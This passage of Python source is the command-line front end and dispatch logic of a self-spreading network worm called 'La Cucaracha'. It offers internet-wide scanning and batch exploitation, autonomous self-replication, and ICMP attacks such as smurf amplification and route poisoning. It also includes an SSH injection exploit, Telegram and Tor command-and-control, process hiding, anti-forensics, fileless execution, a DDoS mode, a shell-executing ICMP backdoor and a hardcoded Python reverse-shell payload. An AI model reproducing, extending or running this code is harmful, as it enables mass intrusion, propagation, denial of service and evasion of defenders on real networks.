  %(prog)s --stealth                # Enable stealth mode
  %(prog)s --interactive            # Interactive worm> prompt
        """,
    )

    # ---- Base Engine Flags ----
    # Operation modes
    parser.add_argument("--scan", action="store_true", help="Run reconnaissance phase")
    parser.add_argument("--deploy", action="store_true", help="Run full deploy cycle")
    parser.add_argument("--serve", action="store_true", help="Start payload hub server")
    parser.add_argument("--mesh", action="store_true", help="Start mesh node (spread + trade + mutate)")
    parser.add_argument("--full-cycle", action="store_true", help="Run complete autonomous cycle")
    parser.add_argument("--auto", action="store_true", help="FULLY AUTONOMOUS: scan -> exploit -> replicate/spread -> repeat")
    parser.add_argument("--discovery-only", action="store_true", help="Autonomous mode: discovery only")
    parser.add_argument("--replicate", action="store_true", help="Enable worm self-replication in autonomous mode")

    # Informational
    parser.add_argument("--status", action="store_true", help="Show engine statistics")
    parser.add_argument("--stats", action="store_true", help="Alias for --status")
    parser.add_argument("--clean", action="store_true", help="Reset all database data")

    # Configuration
    parser.add_argument("--db", default="/opt/hermes/worm_mesh.db", help="Database path")
    parser.add_argument("--subnet", default="0.0.0.0/0", help="Target subnet for scanning")
    parser.add_argument("--rate", type=int, default=10000, help="Masscan packet rate")
    parser.add_argument("--batch", type=int, default=50, help="Exploit batch size")
    parser.add_argument("--hops", type=int, default=3, help="Max mesh spread hops")
    parser.add_argument("--epochs", type=int, default=100, help="Max autonomous navigation epochs")
    parser.add_argument("--hub-port", type=int, default=10004, help="Payload hub port")
    parser.add_argument("--callback-ip", default="", help="Callback IP for reverse shells")
    parser.add_argument("--callback-port", type=int, default=0, help="Callback port for reverse shells")
    parser.add_argument("--seed-peers", nargs="*", default=[], help="Seed peer IPs for mesh bootstrap")
    parser.add_argument("--shodan-key", default="", help="Shodan API key")
    parser.add_argument("--ssh-key", default="", help="SSH private key path")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")

    # Adaptive/DDoS flags
    parser.add_argument("--adaptive-payload", action="store_true", help="Generate per-target adaptive payloads via TCP fingerprint mutation")
    parser.add_argument("--ddos-on-obstacle", action="store_true", help="Spawn DDoS division nodes on WAF/firewall obstacles")

    # ICMP modes
    parser.add_argument("--icmp-tunnel", action="store_true", help="Start ICMP tunnel listener")
    parser.add_argument("--reverse-icmp", nargs=2, metavar=("TARGET_IP", "CMD"), help="Send reverse ICMP shell command")
    parser.add_argument("--icmp-redirect", nargs=2, metavar=("TARGET", "GATEWAY"), help="Send ICMP Redirect (MITM route poison)")
    parser.add_argument("--icmp-mtu", nargs=2, metavar=("TARGET", "MTU"), help="ICMP MTU attack")
    parser.add_argument("--pmtu-poison", type=str, metavar="TARGET", help="CVE-2026-0933: PMTU cache corruption")
    parser.add_argument("--pmtu-poison-all", action="store_true", help="CVE-2026-0933: run full PMTU poison phase on all exploited hosts")
    parser.add_argument("--icmp-smurf", nargs=2, metavar=("VICTIM", "BROADCAST"), help="Smurf amplification attack")
    parser.add_argument("--icmp-poison-ping", type=str, metavar="TARGET", help="ICMP malformed poison ping")
    parser.add_argument("--icmp-rogue-router", nargs=2, metavar=("TARGET", "ROGUE_GW"), help="Rogue router advertisement")
    parser.add_argument("--mqtt-enum", type=str, metavar="TARGET", help="MQTT wildcard enumeration")
    parser.add_argument("--ssh-inject", nargs=2, metavar=("TARGET", "PORT"), help="SSH username injection attack (CVE-2026-35386)")
    parser.add_argument("--icmp-os-fingerprint", type=str, metavar="TARGET", help="ICMP OS fingerprint via timestamp")
    parser.add_argument("--icmp-address-mask", type=str, metavar="TARGET", help="ICMP address mask request")
    parser.add_argument("--icmp-record-route", type=str, metavar="TARGET", help="ICMP record route path mapping")
    parser.add_argument("--icmp-time-exceeded", nargs=4, metavar=("TARGET", "SPORT", "DPORT", "SEQ"), help="ICMP Time Exceeded TCP reset")
    parser.add_argument("--icmp-source-quench", type=str, metavar="TARGET", help="ICMP Source Quench throttle")
    parser.add_argument("--icmp-stego", nargs=2, metavar=("TARGET", "MSG"), help="ICMP stego beacon with GIF camouflage")
    parser.add_argument("--icmp-fragment-overlap", type=str, metavar="TARGET", help="ICMP fragment overlap (IDS evasion)")
    parser.add_argument("--icmp-ttl-sweep", type=str, metavar="TARGET", help="ICMP TTL sweep (traceroute)")
    parser.add_argument("--icmp-parameter-problem", type=str, metavar="TARGET", help="ICMP Parameter Problem (router crash)")
    parser.add_argument("--icmp-multicast-sweep", type=str, metavar="GROUP", nargs="?", default="224.0.0.1", help="ICMP multicast sweep")
    parser.add_argument("--icmp-timing-channel", nargs=2, metavar=("TARGET", "DATA"), help="ICMP timing channel (covert)")
    parser.add_argument("--icmp-rip", nargs=2, metavar=("TARGET", "FAKE_ROUTE"), help="RIP route injection")
    parser.add_argument("--icmp-secure-tunnel-send", nargs=2, metavar=("TARGET", "DATA"), help="XOR-encrypted ICMP tunnel send")
    parser.add_argument("--icmp-secure-tunnel-listen", action="store_true", help="Listen for XOR-encrypted ICMP tunnel traffic")

    # CKAB ICMP Pre-Strike Protocol flags
    parser.add_argument("--icmp-prefilter", action="store_true", help="CKAB L1: Pre-filter ICMP-only hosts before brute")
    parser.add_argument("--icmp-wake", action="store_true", help="CKAB L2: Wake sleeping TCP stacks via ICMP")
    parser.add_argument("--icmp-os-hint", action="store_true", help="CKAB L3: OS-aware credential reduction")
    parser.add_argument("--icmp-inject", type=str, metavar="TARGET", help="CKAB L4: Session-less ICMP kernel payload injection")
    parser.add_argument("--icmp-task-queue", action="store_true", help="CKAB L5: Start ICMP hold-and-release task worker")

    # ---- CKAB Total Stealth Layer Flags ----
    parser.add_argument("--stealth", action="store_true", help="Enable ALL stealth features (TOR + hide + anti-forensics)")
    parser.add_argument("--tor", action="store_true", help="Route all C2 traffic through TOR SOCKS5 proxy")
    parser.add_argument("--doh", action="store_true", help="Use DNS over HTTPS for all DNS lookups")
    parser.add_argument("--fileless", action="store_true", help="Execute worm entirely in memory (no disk reads)")
    parser.add_argument("--hide", action="store_true", help="Hide process and clean forensic traces")
    parser.add_argument("--anti-debug", action="store_true", help="Enable anti-debug/sandbox checks")
    parser.add_argument("--domain-front", type=str, metavar="C2:FRONT", help="Domain fronting: real_c2_domain,front_domain")
    parser.add_argument("--renew-tor", action="store_true", help="Request new TOR circuit and exit")
    parser.add_argument("--stealth-status", action="store_true", help="Show stealth module status and exit")

    # ---- WormMaster flags ----
    parser.add_argument("--exploit", type=str, metavar="IP[:PORT]", help="WormMaster: Exploit a single target")
    parser.add_argument("--post-exploit", type=str, metavar="IP", help="WormMaster: Run post-exploitation on target")
    parser.add_argument("--deploy-agent", type=str, metavar="IP", help="WormMaster: Deploy agent to target")
    parser.add_argument("--telegram", type=str, metavar="MSG", help="WormMaster: Send message via Telegram")
    parser.add_argument("--interactive", action="store_true", help="WormMaster: Start interactive worm> prompt")

    args = parser.parse_args()

    # Configure logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        log.setLevel(logging.DEBUG)

    # Initialize database
    db = Database(args.db)
    log.info(f"La Cucaracha Worm starting — database: {args.db}")

    # ---- CKAB Stealth Initialization (replicating base engine lines 4814-4899) ---
    stealth_active = False
    if HAVE_STEALTH:
        if args.renew_tor:
            if STEALTH._tor_available:
                if STEALTH.renew_tor_circuit():
                    print("[STEALTH] TOR circuit renewed — new IP assigned")
                else:
                    print("[STEALTH] TOR circuit renewal failed")
            else:
                print("[STEALTH] TOR not available")
            return

        if args.stealth_status:
            print("=" * 60)
            print("CKAB TOTAL STEALTH — STATUS")
            print("=" * 60)
            print(f"  Module loaded:              {HAVE_STEALTH}")
            print(f"  TOR SOCKS5 (127.0.0.1:9050): {'ONLINE' if STEALTH._tor_available else 'OFFLINE'}")
            print(f"  I2P SAM bridge:             {'ONLINE' if STEALTH._i2p_available else 'OFFLINE'}")
            print(f"  DoH providers:              {len(doh_query.__defaults__[0]) if hasattr(doh_query, '__defaults__') else 4} configured")
            print(f"  Fronting domains:           {len(FRONT_DOMAINS) if 'FRONT_DOMAINS' in dir() else 14} available")
            print(f"  Process hiding methods:     3 active (prctl + /proc overlay + listdir hook)")
            print(f"  Fileless execution:         3 methods (exec + memfd + ctypes)")
            print(f"  Anti-forensics targets:     bash history, syslog, wtmp, .pyc caches")
            print(f"  Traffic obfuscation:        padding + jitter + dummy traffic")
            print("=" * 60)
            return

        if args.stealth or args.tor or args.hide or args.fileless or args.anti_debug:
            stealth_active = True
            os.environ["CKAB_STEALTH"] = "1"
            print("[STEALTH] Initializing stealth layer...")
            if args.stealth or args.tor:
                if STEALTH._tor_available:
                    print(f"  ✓ TOR routing: ENABLED (SOCKS5 127.0.0.1:9050)")
            if args.stealth or args.doh:
                print(f"  ✓ DNS over HTTPS: ENABLED")
            if args.stealth or args.hide:
                if hide_process():
                    print(f"  ✓ Process hidden (PID {os.getpid()} -> kernel thread)")
                anti_forensics()
                print(f"  ✓ Forensic traces cleaned")
            if args.stealth or args.anti_debug:
                if detect_debugging():
                    print(f"  ⚠ Debugging/sandbox environment DETECTED")
                else:
                    print(f"  ✓ Anti-debug checks: CLEAN")
            if args.stealth or args.fileless:
                print(f"  ✓ Fileless execution mode ready (3 methods)")
                if load_worm_into_memory():
                    print(f"  ✓ Worm loaded into memory")
            if args.domain_front:
                try:
                    c2_domain, front = args.domain_front.split(",")
                    print(f"  ✓ Domain fronting: {c2_domain.strip()} -> {front.strip()}")
                except Exception:
                    print(f"  ✗ Invalid domain front format")
            os.environ["CKAB_STEALTH"] = "1"
            print("[STEALTH] Full stealth layer active")
    # -----------------------------------------------------------------------

    # Handle --status / --stats
    if args.status or args.stats:
        stats = db.stats()
        print("=" * 60)
        print("LA CUCARACHA — STATUS")
        print("=" * 60)
        print(f"  Targets (total):         {stats['targets']}")
        print(f"  Targets (scanned):       {stats['targets_scanned']}")
        print(f"  Targets (exploited):     {stats['targets_exploited']}")
        print(f"  Nodes (active):          {stats['nodes_active']}")
        print(f"  Nodes (total):           {stats['nodes_total']}")
        print(f"  Payloads stored:         {stats['payloads']}")
        print(f"  Deployments (total):     {stats['deployments_total']}")
        print(f"  Deployments (success):   {stats['deployments_success']}")
        print(f"  Deployments (failed):    {stats['deployments_failed']}")
        print("=" * 60)
        return

    # Handle --clean
    if args.clean:
        confirm = input("WARNING: This will delete ALL worm mesh data. Continue? (y/N): ")
        if confirm.lower() == "y":
            db.close()
            if os.path.exists(args.db):
                os.remove(args.db)
                log.info(f"Database {args.db} removed")
            print("Database cleaned.")
        else:
            print("Aborted.")
        return

    # Initialize engines
    recon = WormReconEngine(db=db, scan_rate=args.rate, shodan_api_key=args.shodan_key)
    exploit = WormExploitEngine(db=db, ssh_key_path=args.ssh_key)
    payload_gen = PolymorphicPayloadGenerator(db=db)
    deploy = WormDeploymentEngine(
        db=db, payload_generator=payload_gen, payload_hub_port=args.hub_port,
    )
    mesh_engine = WormMeshEngine(
        db=db, recon_engine=recon, exploit_engine=exploit,
        payload_generator=payload_gen, deployment_engine=deploy,
    )

    # Initialize node if seed peers provided
    node = None
    if args.seed_peers or args.mesh:
        node = WormNode(ip="127.0.0.1", port=22, hostname=socket.gethostname(), db=db)
        mesh_engine.node = node
        if args.seed_peers:
            node.bootstrap(args.seed_peers)

    # Handle --serve
    if args.serve:
        log.info("Starting payload hub server (CTRL+C to stop)...")
        deploy.start_payload_hub()
        try:
            while True:
                time.sleep(10)
                stats = db.stats()
                log.info(f"[Hub] {stats['payloads']} payloads, {stats['targets']} targets, {stats['nodes_active']} nodes")
        except KeyboardInterrupt:
            log.info("Shutting down payload hub...")
            deploy.stop_payload_hub()
        return

    # Handle ICMP tunnel listener
    if args.icmp_tunnel:
        icmp = ICMPEngine(db)
        log.info("ICMP tunnel listener started (press Ctrl+C to stop)")
        try:
            while True:
                data = icmp.icmp_tunnel_listen(timeout=10)
                for ip, payload in data.items():
                    if payload.startswith(b"EXEC:"):
                        cmd = payload[5:].decode()
                        log.info(f"ICMP exec from {ip}: {cmd}")
                        try:
                            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            icmp.icmp_tunnel_send(ip, b"OUT:" + out)
                        except Exception as e:
                            icmp.icmp_tunnel_send(ip, b"OUT:" + str(e).encode())
                    else:
                        log.info(f"ICMP data from {ip}: {len(payload)} bytes")
        except KeyboardInterrupt:
            icmp.stop()
            log.info("ICMP tunnel stopped")
        return

    # Handle --reverse-icmp
    if args.reverse_icmp:
        target, cmd = args.reverse_icmp[0], args.reverse_icmp[1]
        icmp = ICMPEngine(db)
        result = icmp.reverse_icmp_shell(target, cmd)
        print(f"Reply from {target}:\n{result}")
        return

    # Handle --icmp-redirect
    if args.icmp_redirect:
        icmp = ICMPEngine(db)
        target, gateway = args.icmp_redirect[0], args.icmp_redirect[1]
        ok = icmp.icmp_redirect(target, gateway)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP Redirect: {target} -> {gateway}")
        return

    # Handle --icmp-mtu
    if args.icmp_mtu:
        icmp = ICMPEngine(db)
        target, mtu_str = args.icmp_mtu[0], args.icmp_mtu[1]
        mtu = int(mtu_str) if mtu_str.isdigit() else 68
        ok = icmp.icmp_mtu_attack(target, mtu)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP MTU attack: {target} MTU={mtu}")
        return

    # Handle --pmtu-poison
    if args.pmtu_poison:
        icmp = ICMPEngine(db)
        target = args.pmtu_poison
        result = icmp.cve_2026_0933_pmtu_poison(target, burst=12)
        print(f"[{'OK' if result.get('status') == 'sent' else 'FAIL'}] CVE-2026-0933 PMTU poison: {target} — {result.get('packets_sent', 0)} packets sent")
        return

    # Handle --pmtu-poison-all
    if args.pmtu_poison_all:
        print("Running full PMTU poison phase on all exploited hosts...")
        result = mesh_engine.run_pmtu_poison_phase()
        print(f"PMTU poison phase complete: {result['poisoned']}/{result['vulnerable']} vulnerable hosts poisoned (scanned {result['total']})")
        return

    # Handle --icmp-smurf
    if args.icmp_smurf:
        icmp = ICMPEngine(db)
        victim, broadcast = args.icmp_smurf[0], args.icmp_smurf[1]
        sent = icmp.icmp_smurf(victim, broadcast, count=20)
        print(f"[OK] Smurf attack: {sent} packets to {broadcast} spoofing {victim}")
        return

    # Handle --icmp-poison-ping
    if args.icmp_poison_ping:
        icmp = ICMPEngine(db)
        ok = icmp.icmp_poison_ping(args.icmp_poison_ping)
        print(f"[{'OK' if ok else 'FAIL'}] Poison ping: {args.icmp_poison_ping}")
        return

    # Handle --icmp-rogue-router
    if args.icmp_rogue_router:
        icmp = ICMPEngine(db)
        target, rogue_gw = args.icmp_rogue_router[0], args.icmp_rogue_router[1]
        ok = icmp.icmp_rogue_router(target, rogue_gw)
        print(f"[{'OK' if ok else 'FAIL'}] Rogue router: {target} -> {rogue_gw}")
        return

    # Handle --mqtt-enum
    if args.mqtt_enum:
        result = exploit._mqtt_wildcard_enum(args.mqtt_enum, 1883)
        print(f"[{'OK' if result.success else 'FAIL'}] {result.detail or result.error}")
        return

    # Handle --ssh-inject
    if args.ssh_inject:
        target, port_str = args.ssh_inject[0], args.ssh_inject[1]
        port = int(port_str) if port_str.isdigit() else 22
        result = exploit._ssh_username_injection(target, port)
        print(f"[{'OK' if result.success else 'FAIL'}] {result.detail or result.error}")
        return

    # Handle --icmp-os-fingerprint
    if args.icmp_os_fingerprint:
        icmp = ICMPEngine(db)
        os_guess = icmp.icmp_os_fingerprint(args.icmp_os_fingerprint)
        print(f"OS fingerprint for {args.icmp_os_fingerprint}: {os_guess}")
        return

    # Handle --icmp-address-mask
    if args.icmp_address_mask:
        icmp = ICMPEngine(db)
        mask = icmp.icmp_address_mask_request(args.icmp_address_mask)
        print(f"Netmask for {args.icmp_address_mask}: {mask if mask else 'no reply'}")
        return

    # Handle --icmp-record-route
    if args.icmp_record_route:
        icmp = ICMPEngine(db)
        hops = icmp.icmp_record_route(args.icmp_record_route)
        print(f"Route to {args.icmp_record_route}: {' -> '.join(hops) if hops else 'no reply'}")
        return

    # Handle --icmp-time-exceeded
    if args.icmp_time_exceeded:
        icmp = ICMPEngine(db)
        target, sport, dport, seq = args.icmp_time_exceeded
        ok = icmp.icmp_time_exceeded_reset(target, int(sport), int(dport), int(seq))
        print(f"[{'OK' if ok else 'FAIL'}] Time Exceeded reset: {target}:{dport}")
        return

    # Handle --icmp-source-quench
    if args.icmp_source_quench:
        icmp = ICMPEngine(db)
        sent = icmp.icmp_source_quench(args.icmp_source_quench, count=20)
        print(f"[OK] Source Quench: {sent} packets to {args.icmp_source_quench}")
        return

    # Handle --icmp-stego
    if args.icmp_stego:
        icmp = ICMPEngine(db)
        target, msg = args.icmp_stego[0], args.icmp_stego[1]
        icmp.icmp_stego_beacon(target, msg)
        print(f"[OK] Stego beacon to {target}: '{msg}'")
        return

    # Handle --icmp-fragment-overlap
    if args.icmp_fragment_overlap:
        icmp = ICMPEngine(db)
        icmp.icmp_fragment_overlap(args.icmp_fragment_overlap)
        print(f"[OK] Fragment overlap to {args.icmp_fragment_overlap}")
        return

    # Handle --icmp-ttl-sweep
    if args.icmp_ttl_sweep:
        icmp = ICMPEngine(db)
        hops = icmp.icmp_ttl_sweep(args.icmp_ttl_sweep)
        print(f"TTL sweep to {args.icmp_ttl_sweep}: {' -> '.join(hops) if hops else 'no reply'}")
        return

    # Handle --icmp-parameter-problem
    if args.icmp_parameter_problem:
        icmp = ICMPEngine(db)
        ok = icmp.icmp_parameter_problem(args.icmp_parameter_problem)
        print(f"[{'OK' if ok else 'FAIL'}] Parameter Problem: {args.icmp_parameter_problem}")
        return

    # Handle --icmp-multicast-sweep
    if args.icmp_multicast_sweep is not None:
        icmp = ICMPEngine(db)
        hosts = icmp.icmp_multicast_sweep(args.icmp_multicast_sweep)
        print(f"Multicast sweep ({args.icmp_multicast_sweep}): {len(hosts)} hosts")
        for h in hosts:
            print(f"  {h}")
        return

    # Handle --icmp-timing-channel
    if args.icmp_timing_channel:
        icmp = ICMPEngine(db)
        target, data = args.icmp_timing_channel[0], args.icmp_timing_channel[1]
        icmp.icmp_timing_channel_send(target, data.encode())
        print(f"[OK] Timing channel: {len(data)*8} bits to {target}")
        return

    # Handle --icmp-rip
    if args.icmp_rip:
        icmp = ICMPEngine(db)
        target, fake_route = args.icmp_rip[0], args.icmp_rip[1]
        ok = icmp.icmp_rip_injection(target, fake_route)
        print(f"[{'OK' if ok else 'FAIL'}] RIP injection: {target} -> {fake_route}")
        return

    # Handle --icmp-secure-tunnel-send
    if args.icmp_secure_tunnel_send:
        icmp = ICMPEngine(db)
        target, data = args.icmp_secure_tunnel_send[0], args.icmp_secure_tunnel_send[1]
        icmp.icmp_secure_tunnel_send(target, data.encode())
        print(f"[OK] Secure tunnel: {len(data)} bytes to {target}")
        return

    # Handle --icmp-secure-tunnel-listen
    if args.icmp_secure_tunnel_listen:
        icmp = ICMPEngine(db)
        log.info("ICMP secure tunnel listener started (press Ctrl+C to stop)")
        try:
            while True:
                data = icmp.icmp_secure_tunnel_listen(timeout=10)
                for ip, payload in data.items():
                    print(f"[SECURE] {ip}: {len(payload)} bytes -> {payload[:64]}")
        except KeyboardInterrupt:
            icmp.stop()
            log.info("ICMP secure tunnel stopped")
        return

    # Handle --icmp-prefilter (CKAB L1)
    if args.icmp_prefilter:
        icmp = ICMPEngine(db)
        log.info("CKAB ICMP Pre-Filter: testing all targets for TCP liveness...")
        targets = db.get_targets(unexploited_only=True, limit=1000)
        live = 0; dead = 0
        for t in targets:
            ip = t["ip"]
            if icmp.icmp_tcp_liveness_probe(ip):
                live += 1
            else:
                db.execute("UPDATE targets SET exploited=1, notes='icmp_only' WHERE id=?", (t["id"],))
                db.commit()
                dead += 1
        print(f"CKAB Pre-Filter: {live} TCP-live / {dead} ICMP-only (blacklisted)")
        return

    # Handle --icmp-wake (CKAB L2)
    if args.icmp_wake:
        icmp = ICMPEngine(db)
        log.info("CKAB ICMP Wake: attempting TCP stack wake on sleeping targets...")
        targets = db.get_targets(unexploited_only=True, limit=500)
        woke = 0
        for t in targets:
            ip = t["ip"]
            if icmp.icmp_wake_tcp_stack(ip):
                woke += 1
                print(f"  WAKE OK: {ip}")
            time.sleep(0.2)
        print(f"CKAB Wake: {woke} hosts woken")
        return

    # Handle --icmp-os-hint (CKAB L3)
    if args.icmp_os_hint:
        icmp = ICMPEngine(db)
        print(f"{'IP':<20} {'OS':<30} {'TTL':<5} {'Top Creds'}")
        print("-" * 80)
        targets = db.get_targets(unexploited_only=True, limit=100)
        for t in targets:
            ip = t["ip"]
            os_type, creds = icmp.icmp_os_credential_hint(ip)
            print(f"{ip:<20} {os_type:<30} {icmp._get_ttl(ip):<5} {', '.join(creds[:3])}")
        return

    # Handle --icmp-inject (CKAB L4)
    if args.icmp_inject:
        icmp = ICMPEngine(db)
        target = args.icmp_inject
        payload_cmd = b"import socket,subprocess,os;s=s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
        ok = icmp.icmp_inject_payload(target, payload_cmd)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP kernel inject: {target}")
        return

    # Handle --icmp-task-queue (CKAB L5)
    if args.icmp_task_queue:
        log.info("CKAB ICMP Task Queue: starting hold-and-release worker...")
        mesh_engine.start_icmp_task_worker()
        print("CKAB ICMP task worker started - processing pending ICMP tasks...")
        try:
            while True:
                pending = db.execute("SELECT COUNT(*) AS c FROM icmp_tasks WHERE status='pending'").fetchone()["c"]
                done = db.execute("SELECT COUNT(*) AS c FROM icmp_tasks WHERE status='done'").fetchone()["c"]
                print(f"  Pending: {pending} | Done: {done}")
                if pending == 0:
                    print("All ICMP tasks processed. Worker idle.")
                time.sleep(10)
        except KeyboardInterrupt:
            mesh_engine.stop_icmp_task_worker()
            log.info("CKAB ICMP task worker stopped")
        return

    # ---- WormMaster flags ----

    # Handle --exploit (WormMaster single target)
    if args.exploit:
        target_ip = args.exploit
        if ":" in target_ip:
            ip_part, port_part = target_ip.split(":", 1)
        else:
            ip_part, port_part = target_ip, "22"
        print(f"Exploiting {ip_part}:{port_part}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.exploit(ip_part)
        print(json.dumps(result, indent=2))
        return

    # Handle --post-exploit (WormMaster)
    if args.post_exploit:
        print(f"Post-exploitation on {args.post_exploit}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.post_exploit(args.post_exploit, ("root", "root"))
        print(json.dumps(result, indent=2))
        return

    # Handle --deploy-agent (WormMaster)
    if args.deploy_agent:
        print(f"Deploying agent to {args.deploy_agent}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.deploy_agent(args.deploy_agent)
        print(f"Agent deployed: {result}")
        return

    # Handle --telegram (WormMaster)
    if args.telegram:
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.c2_telegram(args.telegram)
        print(f"Telegram sent: {result}")
        return

    # ---- Handle --auto (FULL AUTONOMOUS NAVIGATION) ----
    if args.auto:
        discovery_only = args.discovery_only or False
        log.info(f"=== Autonomous Navigation Mode ===")
        print("\n🚀 LA CUCARACHA — AUTONOMOUS NAVIGATION")
        print(f"   Discovery-only: {discovery_only}")
        print(f"   Self-replicate: {args.replicate}")
        print(f"   Max epochs:     {args.epochs}")
        print("=" * 60)
        result = mesh_engine.autonomous_navigation(
            discovery_only=discovery_only,
            max_epochs=args.epochs,
        )
        print("\n✅ Autonomous navigation complete:")
        print(f"  Epochs:               {result['epochs']}")
        print(f"  Targets found:        {result['targets_found']}")
        print(f"  Targets exploited:    {result['targets_exploited']}")
        print(f"  Replicants deployed:  {result['replicants_deployed']}")
        print(f"  Mesh spreads:         {result['mesh_spreads']}")
        return

    # Handle --full-cycle
    if args.full_cycle:
        args.scan = True
        args.deploy = True
        args.mesh = True

    # Handle --scan
    if args.scan and not args.deploy and not args.mesh:
        log.info("=== Scan-only mode ===")
        count = mesh_engine.run_reconnaissance(subnet=args.subnet)
        print(f"\nScan complete: {count} new targets discovered")
        stats = db.stats()
        print(f"Total targets in database: {stats['targets']}")

    # Handle --deploy (recon -> exploit -> deploy)
    if args.deploy:
        log.info("=== Deploy cycle ===")
        if args.adaptive_payload:
            mesh_engine._adaptive_payload = True
            log.info("Adaptive payload mode enabled")
        if args.ddos_on_obstacle:
            mesh_engine._ddos_on_obstacle = True
            log.info("DDoS-on-obstacle mode enabled")
        result = mesh_engine.run_full_cycle(
            subnet=args.subnet,
            batch_size=args.batch,
            max_spread_hops=args.hops,
        )
        print("\nDeploy cycle complete:")
        print(f"  Exploited:      {result['phases']['exploitation']}")
        print(f"  Deployed:       {result['phases']['deployment']}")
        print(f"  Mesh spread:    {result['phases']['mesh_spread']}")
        pmtu = result['phases'].get('pmtu_poison', {})
        if pmtu and pmtu.get('total', 0) > 0:
            print(f"  PMTU poisoned:  {pmtu['poisoned']}/{pmtu['vulnerable']} vulnerable hosts")
        print(f"  Total targets:  {result['total_targets_exploited']}")

    # Handle --mesh (continuous spreading, trading, mutating)
    if args.mesh:
        log.info("=== Mesh node mode (continuous) ===")
        deploy.start_payload_hub()
        payload_gen.generate_all(callback_ip=args.callback_ip, callback_port=args.callback_port, persist=True)
        log.info("Mesh node operational. Running continuous spread/trade/mutate cycles...")
        cycle_count = 0
        try:
            while True:
                cycle_count += 1
                log.info(f"--- Mesh cycle #{cycle_count} ---")
                spread = mesh_engine.run_mesh_spread(max_hops=args.hops)
                log.info(f"Spread: {spread} new propagations")
                tm = mesh_engine.run_trading_and_mutation()
                log.info(f"Trade: {tm.get('trades', 0)} | Mutations: {tm.get('mutations', 0)}")
                stats = db.stats()
                log.info(f"Status: {stats['nodes_active']} nodes, {stats['targets_exploited']} exploited, {stats['deployments_success']} deploys")
                sleep_time = random.randint(30, 120)
                log.info(f"Sleeping {sleep_time}s before next cycle...")
                for _ in range(sleep_time):
                    if mesh_engine._stop_flag:
                        break
                    time.sleep(1)
        except KeyboardInterrupt:
            log.info("Shutting down mesh node...")
            mesh_engine.stop()
            deploy.stop_payload_hub()
            if node:
                node.stop_heartbeat()
            log.info("Mesh node terminated.")

    # ---- WormMaster Interactive Mode ----
    if args.interactive or not any([args.scan, args.deploy, args.serve, args.mesh,
                                     args.full_cycle, args.auto,
                                     args.status, args.stats, args.clean,
                                     args.exploit, args.post_exploit,
                                     args.deploy_agent, args.telegram]):
        if not args.interactive and any([args.scan, args.deploy, args.serve, args.mesh,
                                          args.full_cycle, args.auto, args.status,
                                          args.stats, args.clean, args.exploit,
                                          args.post_exploit, args.deploy_agent,
                                          args.telegram]):
            return  # Already handled above
        print("🧬 LA CUCARACHA v2.0 — Interactive Mode")
        print("Type 'help' for commands, 'exit' to quit")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        try:
            while True:
                try:
                    cmd = input("\nworm> ").strip()
                    if not cmd:
                        continue
                    if cmd in ("exit", "quit"):
                        break
                    if cmd == "help":
                        print("Commands: deploy, scan <subnet>, exploit <ip>, mesh, status, post-exploit <ip> <user> <pass>, deploy-agent <ip>, telegram <msg>, exit")
                        continue
                    if cmd.startswith("scan"):
                        parts = cmd.split()
                        subnet = parts[1] if len(parts) > 1 else "0.0.0.0/0"
                        result = master.scan(subnet)
                        print(json.dumps(result, indent=2))
                    elif cmd.startswith("exploit"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: exploit <ip>")
                            continue
                        result = master.exploit(parts[1])
                        print(json.dumps(result, indent=2))
                    elif cmd == "deploy":
                        result = master.deploy()
                        print(json.dumps(result, indent=2))
                    elif cmd == "mesh":
                        print("Mesh started (use --mesh flag for continuous mode)")
                    elif cmd == "status":
                        status = master.get_status()
                        print(json.dumps(status, indent=2))
                    elif cmd.startswith("post-exploit"):
                        parts = cmd.split()
                        if len(parts) < 4:
                            print("Usage: post-exploit <ip> <user> <pass>")
                            continue
                        result = master.post_exploit(parts[1], (parts[2], parts[3]))
                        print(json.dumps(result, indent=2))
                    elif cmd.startswith("deploy-agent"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: deploy-agent <ip>")
                            continue
                        result = master.deploy_agent(parts[1])
                        print(f"Deployed: {result}")
                    elif cmd.startswith("telegram"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: telegram <message>")
                            continue
                        result = master.c2_telegram(" ".join(parts[1:]))
                        print(f"Sent: {result}")
                    else:
                        print(f"Unknown command: {cmd}")
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"Error: {e}")
        finally:
            master.stop()

    # If no mode specified, show help
    if not any([args.scan, args.deploy, args.serve, args.mesh,
                args.full_cycle, args.auto,
                args.status, args.stats, args.clean,
                args.exploit, args.post_exploit,
                args.deploy_agent, args.telegram,
                args.interactive,
                args.icmp_tunnel, args.reverse_icmp,
                args.icmp_redirect, args.icmp_mtu,
                args.pmtu_poison, args.pmtu_poison_all,
                args.icmp_smurf, args.icmp_poison_ping,
                args.icmp_rogue_router, args.mqtt_enum,
                args.ssh_inject, args.icmp_os_fingerprint,
                args.icmp_address_mask, args.icmp_record_route,
                args.icmp_time_exceeded, args.icmp_source_quench,
                args.icmp_stego, args.icmp_fragment_overlap,
                args.icmp_ttl_sweep, args.icmp_parameter_problem,
                args.icmp_multicast_sweep, args.icmp_timing_channel,
                args.icmp_rip, args.icmp_secure_tunnel_send,
                args.icmp_secure_tunnel_listen,
                args.icmp_prefilter, args.icmp_wake,
                args.icmp_os_hint, args.icmp_inject,
                args.icmp_task_queue,
                args.stealth, args.stealth_status,
                args.renew_tor, args.fileless,
                args.hide, args.anti_debug,
                args.domain_front, args.tor, args.doh,
            ]):
        parser.print_help()


if __name__ == "__main__":
    import socket
    main()
